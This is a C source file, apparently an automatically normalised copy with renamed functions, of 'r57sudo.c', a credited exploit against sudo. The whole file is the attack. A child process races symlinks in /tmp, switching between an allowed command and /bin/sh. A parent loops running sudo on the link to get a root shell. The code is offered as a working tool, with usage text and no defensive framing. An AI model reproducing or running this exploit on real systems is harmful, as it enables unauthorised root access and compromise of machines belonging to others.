#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  race ;
typedef  scalar_t__ pid_t ;
typedef  int /*<<< orphan*/  exec ;

/* Variables and functions */
 int BUFSIZ ; 
 int EX_USAGE ; 
 char* SUDO ; 
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 scalar_t__ FUNC1 (int,int) ; 
 scalar_t__ FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC4 (char*,int,char*,char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 

int FUNC6 (int argc, char ** argv) 
{ 
pid_t pid; 
void * buffer; 
char * exec, * race, * path; 
if(argc != 3) 
{ 
FUNC3(stderr, "r57sudo.c by __blf\n"); 
FUNC3(stderr, "RusH Security Team\n"); 
FUNC3(stderr, "Usage: %s <sudo full path command> <sudo command>\n", 
argv[0]); 
FUNC3(stderr, "e.g. ./r57sudo /bin/ls ls\n"); 
return EX_USAGE; 
} 
pid = FUNC2(); 
if(pid == 0) 
{ 
while(1) 
{ 
exec = (char *)FUNC1(BUFSIZ, sizeof(char)); 
race = (char *)FUNC1(BUFSIZ, sizeof(char)); 
FUNC0(exec, sizeof(exec)); 
FUNC4(exec, BUFSIZ, "ln -fs %s /tmp/%s", argv[1], argv[2]); 
FUNC5((char *)exec); 
FUNC0(race, sizeof(race)); 
FUNC4(race, BUFSIZ, "rm /tmp/%s", argv[2]); 
FUNC5((char *)race); 
FUNC0(race, sizeof(race)); 
FUNC4(race, BUFSIZ, "ln -fs /bin/sh /tmp/%s", argv[2]); 
FUNC5((char *)race); 
FUNC0(race, sizeof(race)); 
FUNC4(race, BUFSIZ, "rm /tmp/%s", argv[2]); 
FUNC5((char *)race); 
} 
} 
if(pid > 0) 
{ 
while(1) 
{ 
path = (char *)FUNC1(BUFSIZ/2, sizeof(char)); 
FUNC4(path, BUFSIZ/2, "%s /tmp/%s", SUDO, argv[2]); 
FUNC5((char *)path); 
} 
} 
}